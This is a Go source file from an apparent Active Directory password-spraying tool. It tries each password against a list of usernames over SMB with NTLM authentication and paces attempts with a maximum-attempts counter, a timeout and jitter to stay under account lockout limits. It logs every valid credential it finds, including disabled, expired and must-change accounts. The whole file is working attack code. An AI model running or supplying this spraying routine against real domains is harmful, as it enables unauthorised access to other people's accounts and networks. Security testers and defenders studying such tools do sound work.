package spray

import (
	"github.com/ShamelessNanoUser/ADSpray/logger"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/spnego"
)

// Define colours
var Green = "\033[32m"
var Red = "\033[91m"
var Purple = "\033[35m"
var White = "\033[0m"

func setupConnectionAsUser(ipAddress string, username string, password string, domain string) (*smb.Connection, error) {
	// Initialize SMB Connection
	options := smb.Options{
		Host: ipAddress,
		Port: 445,
		Initiator: &spnego.NTLMInitiator{
			User:     username,
			Password: password,
			Domain:   domain,
		},
	}

	// Setup new SMB session
	session, err := smb.NewConnection(options)

	return session, err
}

func checkAttempts(attempts int, maxAttempts int) bool {
	if attempts == maxAttempts {
		return true
	} else {
		return false
	}

}

func waitForTimeout(timeout int) {
	timeoutDuration := time.Duration(timeout) * time.Minute

	for remaining := timeoutDuration; remaining >= 0; remaining -= time.Second {
		// Calculate minutes and seconds
		minutes := int(remaining.Minutes())
		seconds := int(remaining.Seconds()) % 60

		// Print the remaining time on the same line
		fmt.Printf("\r[+] Reached maximum attempts, sleeping for: %02d:%02d", minutes, seconds)

		// Wait for 1 second
		time.Sleep(1 * time.Second)
	}

	// Print newline to make sure output is not truncated
	fmt.Println()
}

func evaluateResponse(logfile string, session *smb.Connection, err error, username string, password string) {

	// The user is authenticated -> password is correct
	if session.IsAuthenticated() {
		logEntry := ("[!] Found valid credentials: " + username + ":" + password)

		fmt.Println(Green + logEntry + White)
		logger.AddLogEntry(logfile, logEntry)

		return
	}

	// If the user is not authenticated -> loop over errors
	status := err.Error()

	switch status {
	// Positive cases
	case "Account disabled!":
		logEntry := ("[!] Found valid credentials: " + username + ":" + password + " - NT_STATUS_DISABLED")

		fmt.Println(Purple + logEntry + White)
		logger.AddLogEntry(logfile, logEntry)

		return

	case "Password expired!":
		logEntry := ("[!] Found valid credentials: " + username + ":" + password + " - STATUS_PASSWORD_EXPIRED")

		fmt.Println(Purple + logEntry + White)
		logger.AddLogEntry(logfile, logEntry)

		return

	case "User is required to change password at next logon":
		logEntry := ("[!] Found valid credentials: " + username + ":" + password + " - NT_STATUS_PASSWORD_MUST_CHANGE")

		fmt.Println(Purple + logEntry + White)
		logger.AddLogEntry(logfile, logEntry)

		return

	// Negatives cases
	case "User account has been locked!":
		logEntry := ("[-] Failed to connect: " + username + ":" + password + " - STATUS_ACCOUNT_LOCKED_OUT")

		fmt.Println(Red + logEntry + White)
		logger.AddLogEntry(logfile, logEntry)

		return

	case "Logon failed":
		logEntry := ("[-] Invalid credentials: " + username + ":" + password)
		logger.AddLogEntry(logfile, logEntry)

		return

	default:
		logEntry := ("[-] Invalid credentials: " + username + ":" + password + " " + err.Error())
		logger.AddLogEntry(logfile, logEntry)

		return
	}
}

func StartSMBSpray(domain string, ipAddress string, usernameArray []string, passwordArray []string, logfile string, maxAttempts int, timeout int, jitter int) {

	// Test Connection
	_, err := setupConnectionAsUser(ipAddress, "", "", "")
	if strings.Contains(err.Error(), "no route to host") {
		fmt.Println("[!] Could not connect to server, exiting...")
		os.Exit(0)
	}

	// Set attempts to 0
	var attempt int = 0

	for _, password := range passwordArray {

		// If the max amount of attempts is reached, sleep for specified time
		sleep := checkAttempts(attempt, maxAttempts)

		// Wait for specified minutes and reset attempt counter
		if sleep {
			logger.AddLogEntry(logfile, "Reached maximum attempts, waiting...")
			waitForTimeout(timeout)
			attempt = 0
		}

		fmt.Println("[+] Spraying the password", password)
		logger.AddLogEntry(logfile, "Started spraying the following password: "+password)

		// Looping over users and trying one password at a time
		for _, username := range usernameArray {

			// Create connection with username and password
			session, err := setupConnectionAsUser(ipAddress, username, password, domain)

			// Evaluate response, print status
			evaluateResponse(logfile, session, err, username, password)

			// Wait for value in jitter
			time.Sleep(time.Duration(jitter) * time.Millisecond)
		}

		// Increase counter after spraying all users with one password
		attempt++
	}
}
